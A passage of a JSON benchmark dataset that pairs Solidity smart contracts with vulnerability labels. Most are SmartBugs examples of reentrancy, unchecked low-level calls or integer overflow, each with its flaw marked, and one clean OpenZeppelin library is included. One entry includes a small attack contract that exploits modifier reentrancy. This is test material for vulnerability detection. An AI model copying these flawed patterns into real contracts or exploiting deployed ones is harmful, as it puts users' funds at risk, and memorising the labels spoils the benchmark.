    "contract_name": "0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 41\n */\n\npragma solidity ^0.4.19;\n\ncontract ETH_VAULT\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function ETH_VAULT(address _log)\n    public \n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender])\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 77,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.24;\n\ncontract Proxy  {\n    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n    function proxy(address target, bytes data) public payable {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        target.call.value(msg.value)(data);\n    }\n}\n\ncontract VaultProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n    \n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            deposit();\n        }\n    }\n    \n    function deposit() public payable {\n        if (msg.value > 0.5 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n    \n    function withdraw(uint256 amount) public onlyOwner {\n        if (amount>0 && Deposits[msg.sender]>=amount) {\n            msg.sender.transfer(amount);\n        }\n    }\n}",
    "num_lines": 42,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xb620cee6b52f96f3c6b253e6eea556aa2d214a99",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xb620cee6b52f96f3c6b253e6eea556aa2d214a99.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 100,106,133\n */\n\n// by nightman\n// winner gets the contract balance\n// 0.02 to play\n\n\npragma solidity ^0.4.23;\n\ncontract DrainMe {\n\n//constants\n\naddress public winner = 0x0;\naddress public owner;\naddress public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;\naddress public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;\naddress[] public players;\n\nmapping(address=>bool) approvedPlayers;\n\nuint256 public secret;\nuint256[] public seed = [951828771,158769871220];\nuint256[] public balance;\n\n//constructor\n\nfunction DranMe() public payable{\n\towner = msg.sender;\n}\n\n//modifiers\n\nmodifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n}\n\nmodifier onlyWinner() {\n    require(msg.sender == winner);\n    _;\n}\n\nmodifier onlyPlayers() {\n    require(approvedPlayers[msg.sender]);\n    _;\n}\n\n//functions\n\nfunction getLength() public constant returns(uint256) {\n\treturn seed.length;\n}\n\nfunction setSecret(uint256 _secret) public payable onlyOwner{\n\tsecret = _secret;\n}\n\nfunction getPlayerCount() public constant returns(uint256) {\n\treturn players.length;\n}\n\nfunction getPrize() public constant returns(uint256) {\n\treturn address(this).balance;\n}\n\nfunction becomePlayer() public payable{\n\trequire(msg.value >= 0.02 ether);\n\tplayers.push(msg.sender);\n\tapprovedPlayers[msg.sender]=true;\n}\n\nfunction manipulateSecret() public payable onlyPlayers{\n\trequire (msg.value >= 0.01 ether);\n\tif(msg.sender!=owner || unlockSecret()){\n\t    uint256 amount = 0;\n        msg.sender.transfer(amount);\n\t}\n}\n\nfunction unlockSecret() private returns(bool){\n    bytes32 hash = keccak256(blockhash(block.number-1));\n    uint256 secret = uint256(hash);\n        if(secret%5==0){\n            winner = msg.sender;\n            return true;\n        }\n        else{\n            return false;\n        }\n    }\n\nfunction callFirstTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\t// <yes> <report> UNCHECKED_LL_CALLS\n\tfirstTarget.call.value(msg.value)();\n}\n\nfunction callSecondTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\t// <yes> <report> UNCHECKED_LL_CALLS\n\tsecondTarget.call.value(msg.value)();\n}\n\nfunction setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {\n\tseed[_index] = _value;\n}\n\t\nfunction addSeed (uint256 _add) public payable onlyPlayers {\n\tseed.length = _add;\n}\n\nfunction guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {\n\treturn (_seed / (seed[0]*seed[1]));\n\tif((_seed / (seed[0]*seed[1])) == secret) {\n\t\towner = winner;\n\t}\n}\n\nfunction checkSecret () public payable onlyPlayers returns(bool) {\n    require(msg.value >= 0.01 ether);\n    if(msg.value == secret){\n        return true;\n    }\n}\n\nfunction winPrize() public payable onlyOwner {\n\t// <yes> <report> UNCHECKED_LL_CALLS\n\towner.call.value(1 wei)();\n}\n\nfunction claimPrize() public payable onlyWinner {\n\twinner.transfer(address(this).balance);\n}\n\n//fallback function\n\nfunction() public payable{\n\t}\n}",
    "num_lines": 144,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 56\n */\n\npragma solidity ^0.4.16;\n\n/// @author Bowen Sanders\n/// sections built on the work of Jordi Baylina (Owned, data structure)\n/// smartwedindex.sol contains a simple index of contract address, couple name, actual marriage date, bool displayValues to\n/// be used to create an array of all SmartWed contracts that are deployed \n/// contract 0wned is licesned under GNU-3\n\n/// @dev `Owned` is a base level contract that assigns an `owner` that can be\n///  later changed\ncontract Owned {\n\n    /// @dev `owner` is the only address that can call a function with this\n    /// modifier\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    address public owner;\n\n    /// @notice The Constructor assigns the message sender to be `owner`\n    function Owned() {\n        owner = msg.sender;\n    }\n\n    address public newOwner;\n\n    /// @notice `owner` can step down and assign some other address to this role\n    /// @param _newOwner The address of the new owner\n    ///  an unowned neutral vault, however that cannot be undone\n    function changeOwner(address _newOwner) onlyOwner {\n        newOwner = _newOwner;\n    }\n    /// @notice `newOwner` has to accept the ownership before it is transferred\n    ///  Any account or any contract with the ability to call `acceptOwnership`\n    ///  can be used to accept ownership of this contract, including a contract\n    ///  with no other functions\n    function acceptOwnership() {\n        if (msg.sender == newOwner) {\n            owner = newOwner;\n        }\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function execute(address _dst, uint _value, bytes _data) onlyOwner {\n         // <yes> <report> UNCHECKED_LL_CALLS\n        _dst.call.value(_value)(_data);\n    }\n}\n\n// contract WedIndex \n\ncontract WedIndex is Owned {\n\n    // declare index data variables\n    string public wedaddress;\n    string public partnernames;\n    uint public indexdate;\n    uint public weddingdate;\n    uint public displaymultisig;\n\n    IndexArray[] public indexarray;\n\n    struct IndexArray {\n        uint indexdate;\n        string wedaddress;\n        string partnernames;\n        uint weddingdate;\n        uint displaymultisig;\n    }\n    \n    function numberOfIndex() constant public returns (uint) {\n        return indexarray.length;\n    }\n\n\n    // make functions to write and read index entries and nubmer of entries\n    function writeIndex(uint indexdate, string wedaddress, string partnernames, uint weddingdate, uint displaymultisig) {\n        indexarray.push(IndexArray(now, wedaddress, partnernames, weddingdate, displaymultisig));\n        IndexWritten(now, wedaddress, partnernames, weddingdate, displaymultisig);\n    }\n\n    // declare events\n    event IndexWritten (uint time, string contractaddress, string partners, uint weddingdate, uint display);\n}",
    "num_lines": 94,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\n pragma solidity ^0.4.18;\n\ncontract MultiplicatorX4\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n    \n    function multiplicate(address adr)\n    public\n    payable\n    {\n        if(msg.value>=this.balance)\n        {        \n            adr.transfer(this.balance+msg.value);\n        }\n    }\n}",
    "num_lines": 41,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 38\n */\n\npragma solidity ^0.4.19;\n\ncontract PrivateBank\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function PrivateBank(address _log)\n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {            \n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 74,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "reentrancy_dao",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/reentrancy_dao.sol",
    "contract_code": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18\n */\n\npragma solidity ^0.4.19;\n\ncontract ReentrancyDAO {\n    mapping (address => uint) credit;\n    uint balance;\n\n    function withdrawAll() public {\n        uint oCredit = credit[msg.sender];\n        if (oCredit > 0) {\n            balance -= oCredit;\n            // <yes> <report> REENTRANCY\n            bool callResult = msg.sender.call.value(oCredit)();\n            require (callResult);\n            credit[msg.sender] = 0;\n        }\n    }\n\n    function deposit() public payable {\n        credit[msg.sender] += msg.value;\n        balance += msg.value;\n    }\n}\n",
    "num_lines": 29,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "modifier_reentrancy",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/modifier_reentrancy.sol",
    "contract_code": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol\n * @author: - \n * @vulnerable_at_lines: 15\n */\n\npragma solidity ^0.4.24;\n\ncontract ModifierEntrancy {\n  mapping (address => uint) public tokenBalance;\n  string constant name = \"Nu Token\";\n\n  //If a contract has a zero balance and supports the token give them some token\n  // <yes> <report> REENTRANCY\n  function airDrop() hasNoBalance supportsToken  public{\n    tokenBalance[msg.sender] += 20;\n  }\n\n  //Checks that the contract responds the way we want\n  modifier supportsToken() {\n    require(keccak256(abi.encodePacked(\"Nu Token\")) == Bank(msg.sender).supportsToken());\n    _;\n  }\n  //Checks that the caller has a zero balance\n  modifier hasNoBalance {\n      require(tokenBalance[msg.sender] == 0);\n      _;\n  }\n}\n\ncontract Bank{\n    function supportsToken() external pure returns(bytes32){\n        return(keccak256(abi.encodePacked(\"Nu Token\")));\n    }\n}\n\ncontract attack{ //An example of a contract that breaks the contract above.\n    bool hasBeenCalled;\n    function supportsToken() external returns(bytes32){\n        if(!hasBeenCalled){\n            hasBeenCalled = true;\n            ModifierEntrancy(msg.sender).airDrop();\n        }\n        return(keccak256(abi.encodePacked(\"Nu Token\")));\n    }\n    function call(address token) public{\n        ModifierEntrancy(token).airDrop();\n    }\n}\n",
    "num_lines": 50,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "CircularBuffer",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/structs/CircularBuffer.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (utils/structs/CircularBuffer.sol)\n\npragma solidity ^0.8.24;\n\nimport {Math} from \"../math/Math.sol\";\nimport {Arrays} from \"../Arrays.sol\";\nimport {Panic} from \"../Panic.sol\";\n\n/**\n * @dev A fixed-size buffer for keeping `bytes32` items in storage.\n *\n * This data structure allows for pushing elements to it, and when its length exceeds the specified fixed size,\n * new items take the place of the oldest element in the buffer, keeping at most `N` elements in the\n * structure.\n *\n * Elements can't be removed but the data structure can be cleared. See {clear}.\n *\n * Complexity:\n *\n * - insertion ({push}): O(1)\n * - lookup ({last}): O(1)\n * - inclusion ({includes}): O(N) (worst case)\n * - reset ({clear}): O(1)\n *\n * The struct is called `Bytes32CircularBuffer`. Other types can be cast to and from `bytes32`. This data structure\n * can only be used in storage, and not in memory.\n *\n * Example usage:\n *\n * ```solidity\n * contract Example {\n *     // Add the library methods\n *     using CircularBuffer for CircularBuffer.Bytes32CircularBuffer;\n *\n *     // Declare a buffer storage variable\n *     CircularBuffer.Bytes32CircularBuffer private myBuffer;\n *\n *     constructor() {\n *         myBuffer.setup(16); // Initialize the buffer with a non-zero fixed size (e.g., 16)\n *     }\n *\n *     function pushValue(bytes32 value) external {\n *         myBuffer.push(value); // Safe to push because the buffer was initialized in the constructor\n *     }\n * }\n * ```\n *\n * NOTE: Make sure to call {setup} on your buffer during construction/initialization\n *\n * _Available since v5.1._\n */\nlibrary CircularBuffer {\n    /**\n     * @dev Error emitted when trying to setup a buffer with a size of 0.\n     */\n    error InvalidBufferSize();\n\n    /**\n     * @dev Counts the number of items that have been pushed to the buffer. The residuo modulo _data.length indicates\n     * where the next value should be stored.\n     *\n     * Struct members have an underscore prefix indicating that they are \"private\" and should not be read or written to\n     * directly. Use the functions provided below instead. Modifying the struct manually may violate assumptions and\n     * lead to unexpected behavior.\n     *\n     * In a full buffer:\n     * - The most recently pushed item (last) is at data[(index - 1) % data.length]\n     * - The oldest item (first) is at data[index % data.length]\n     */\n    struct Bytes32CircularBuffer {\n        uint256 _count;\n        bytes32[] _data;\n    }\n\n    /**\n     * @dev Initialize a new CircularBuffer of a given size.\n     *\n     * If the CircularBuffer was already setup and used, calling that function again will reset it to a blank state.\n     *\n     * NOTE: The size of the buffer will affect the execution of {includes} function, as it has a complexity of O(N).\n     * Consider a large buffer size may render the function unusable.\n     */\n    function setup(Bytes32CircularBuffer storage self, uint256 size) internal {\n        if (size == 0) revert InvalidBufferSize();\n        clear(self);\n        Arrays.unsafeSetLength(self._data, size);\n    }\n\n    /**\n     * @dev Clear all data in the buffer without resetting memory, keeping the existing size.\n     */\n    function clear(Bytes32CircularBuffer storage self) internal {\n        self._count = 0;\n    }\n\n    /**\n     * @dev Push a new value to the buffer. If the buffer is already full, the new value replaces the oldest value in\n     * the buffer.\n     */\n    function push(Bytes32CircularBuffer storage self, bytes32 value) internal {\n        uint256 index = self._count++;\n        uint256 modulus = self._data.length;\n        Arrays.unsafeAccess(self._data, index % modulus).value = value;\n    }\n\n    /**\n     * @dev Number of values currently in the buffer. This value is 0 for an empty buffer, and cannot exceed the size of\n     * the buffer.\n     */\n    function count(Bytes32CircularBuffer storage self) internal view returns (uint256) {\n        return Math.min(self._count, self._data.length);\n    }\n\n    /**\n     * @dev Length of the buffer. This is the maximum number of elements kept in the buffer.\n     */\n    function length(Bytes32CircularBuffer storage self) internal view returns (uint256) {\n        return self._data.length;\n    }\n\n    /**\n     * @dev Getter for the i-th value in the buffer, from the end.\n     *\n     * Reverts with {Panic-ARRAY_OUT_OF_BOUNDS} if trying to access an element that was not pushed, or that was\n     * dropped to make room for newer elements.\n     */\n    function last(Bytes32CircularBuffer storage self, uint256 i) internal view returns (bytes32) {\n        uint256 index = self._count;\n        uint256 modulus = self._data.length;\n        uint256 total = Math.min(index, modulus); // count(self)\n        if (i >= total) {\n            Panic.panic(Panic.ARRAY_OUT_OF_BOUNDS);\n        }\n        return Arrays.unsafeAccess(self._data, (index - i - 1) % modulus).value;\n    }\n\n    /**\n     * @dev Check if a given value is in the buffer.\n     */\n    function includes(Bytes32CircularBuffer storage self, bytes32 value) internal view returns (bool) {\n        uint256 index = self._count;\n        uint256 modulus = self._data.length;\n        uint256 total = Math.min(index, modulus); // count(self)\n        for (uint256 i = 0; i < total; ++i) {\n            if (Arrays.unsafeAccess(self._data, (index - i - 1) % modulus).value == value) {\n                return true;\n            }\n        }\n        return false;\n    }\n}\n",
    "num_lines": 153,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x561eac93c92360949ab1f1403323e6db345cbf31",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract BANK_SAFE\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 96,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "etherbank",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/etherbank.sol",
    "contract_code": "/*\n * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/reentrant.sol\n * @author: -\n * @vulnerable_at_lines: 21\n */\n\npragma solidity ^0.4.0;\ncontract EtherBank{\n    mapping (address => uint) userBalances;\n    function getBalance(address user) constant returns(uint) {  \n\t\treturn userBalances[user];\n\t}\n\n\tfunction addToBalance() {  \n\t\tuserBalances[msg.sender] += msg.value;\n\t}\n\n\tfunction withdrawBalance() {  \n\t\tuint amountToWithdraw = userBalances[msg.sender];\n        // <yes> <report> REENTRANCY\n\t\tif (!(msg.sender.call.value(amountToWithdraw)())) { throw; }\n\t\tuserBalances[msg.sender] = 0;\n\t}    \n}",
    "num_lines": 24,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "insecure_transfer",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/insecure_transfer.sol",
    "contract_code": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/#front-running-aka-transaction-ordering-dependence\n * @author: consensys\n * @vulnerable_at_lines: 18\n */\n\npragma solidity ^0.4.10;\n\ncontract IntegerOverflowAdd {\n    mapping (address => uint256) public balanceOf;\n\n    // INSECURE\n    function transfer(address _to, uint256 _value) public{\n        /* Check if sender has balance */\n        require(balanceOf[msg.sender] >= _value);\n        balanceOf[msg.sender] -= _value;\n        // <yes> <report> ARITHMETIC\n        balanceOf[_to] += _value;\n}\n\n}\n",
    "num_lines": 22,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.24;\n\n\ncontract airPort{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v);\n        }\n        return true;\n    }\n}",
    "num_lines": 21,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 201,213\n */\n\npragma solidity ^0.4.24;\n\ncontract PoCGame\n{\n    \n    /**\n     * Modifiers\n     */\n     \n    modifier onlyOwner()\n    {\n        require(msg.sender == owner);\n        _;\n    }\n    \n   modifier isOpenToPublic()\n    {\n        require(openToPublic);\n        _;\n    }\n\n    modifier onlyRealPeople()\n    {\n          require (msg.sender == tx.origin);\n        _;\n    }\n\n    modifier  onlyPlayers()\n    { \n        require (wagers[msg.sender] > 0); \n        _; \n    }\n    \n   \n    /**\n     * Events\n     */\n    event Wager(uint256 amount, address depositer);\n    event Win(uint256 amount, address paidTo);\n    event Lose(uint256 amount, address loser);\n    event Donate(uint256 amount, address paidTo, address donator);\n    event DifficultyChanged(uint256 currentDifficulty);\n    event BetLimitChanged(uint256 currentBetLimit);\n\n    /**\n     * Global Variables\n     */\n    address private whale;\n    uint256 betLimit;\n    uint difficulty;\n    uint private randomSeed;\n    address owner;\n    mapping(address => uint256) timestamps;\n    mapping(address => uint256) wagers;\n    bool openToPublic;\n    uint256 totalDonated;\n\n    /**\n     * Constructor\n     */\n    constructor(address whaleAddress, uint256 wagerLimit) \n    onlyRealPeople()\n    public \n    {\n        openToPublic = false;\n        owner = msg.sender;\n        whale = whaleAddress;\n        totalDonated = 0;\n        betLimit = wagerLimit;\n        \n    }\n\n\n    /**\n     * Let the public play\n     */\n    function OpenToThePublic() \n    onlyOwner()\n    public\n    {\n        openToPublic = true;\n    }\n    \n    /**\n     * Adjust the bet amounts\n     */\n    function AdjustBetAmounts(uint256 amount) \n    onlyOwner()\n    public\n    {\n        betLimit = amount;\n        \n        emit BetLimitChanged(betLimit);\n    }\n    \n     /**\n     * Adjust the difficulty\n     */\n    function AdjustDifficulty(uint256 amount) \n    onlyOwner()\n    public\n    {\n        difficulty = amount;\n        \n        emit DifficultyChanged(difficulty);\n    }\n    \n    \n    function() public payable { }\n\n    /**\n     * Wager your bet\n     */\n    function wager()\n    isOpenToPublic()\n    onlyRealPeople() \n    payable\n    public \n    {\n        //You have to send exactly 0.01 ETH.\n        require(msg.value == betLimit);\n        \n        //You cannot wager multiple times\n        require(wagers[msg.sender] == 0);\n\n        //log the wager and timestamp(block number)\n        timestamps[msg.sender] = block.number;\n        wagers[msg.sender] = msg.value;\n        emit Wager(msg.value, msg.sender);\n    }\n    \n    /**\n     * method to determine winners and losers\n     */\n    function play()\n    isOpenToPublic()\n    onlyRealPeople()\n    onlyPlayers()\n    public\n    {\n        uint256 blockNumber = timestamps[msg.sender];\n        if(blockNumber < block.number)\n        {\n            timestamps[msg.sender] = 0;\n            wagers[msg.sender] = 0;\n    \n            uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1;\n    \n            if(winningNumber == difficulty / 2)\n            {\n                payout(msg.sender);\n            }\n            else \n            {\n                //player loses\n                loseWager(betLimit / 2);\n            }    \n        }\n        else\n        {\n            revert();\n        }\n    }\n\n    /**\n     * For those that just want to donate to the whale\n     */\n    function donate()\n    isOpenToPublic()\n    public \n    payable\n    {\n        donateToWhale(msg.value);\n    }\n\n    /**\n     * Payout ETH to winner\n     */\n    function payout(address winner) \n    internal \n    {\n        uint256 ethToTransfer = address(this).balance / 2;\n        \n        winner.transfer(ethToTransfer);\n        emit Win(ethToTransfer, winner);\n    }\n\n    /**\n     * Payout ETH to whale\n     */\n    function donateToWhale(uint256 amount) \n    internal \n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n        totalDonated += amount;\n        emit Donate(amount, whale, msg.sender);\n    }\n\n    /**\n     * Payout ETH to whale when player loses\n     */\n    function loseWager(uint256 amount) \n    internal \n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n        totalDonated += amount;\n        emit Lose(amount, msg.sender);\n    }\n    \n\n    /**\n     * ETH balance of contract\n     */\n    function ethBalance() \n    public \n    view \n    returns (uint256)\n    {\n        return address(this).balance;\n    }\n    \n    \n    /**\n     * current difficulty of the game\n     */\n    function currentDifficulty() \n    public \n    view \n    returns (uint256)\n    {\n        return difficulty;\n    }\n    \n    \n    /**\n     * current bet amount for the game\n     */\n    function currentBetLimit() \n    public \n    view \n    returns (uint256)\n    {\n        return betLimit;\n    }\n    \n    function hasPlayerWagered(address player)\n    public \n    view \n    returns (bool)\n    {\n        if(wagers[player] > 0)\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n        \n    }\n\n    /**\n     * For the UI to properly display the winner's pot\n     */\n    function winnersPot() \n    public \n    view \n    returns (uint256)\n    {\n        return address(this).balance / 2;\n    }\n\n    /**\n     * A trap door for when someone sends tokens other than the intended ones so the overseers can decide where to send them.\n     */\n    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) \n    public \n    onlyOwner() \n    returns (bool success) \n    {\n        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n    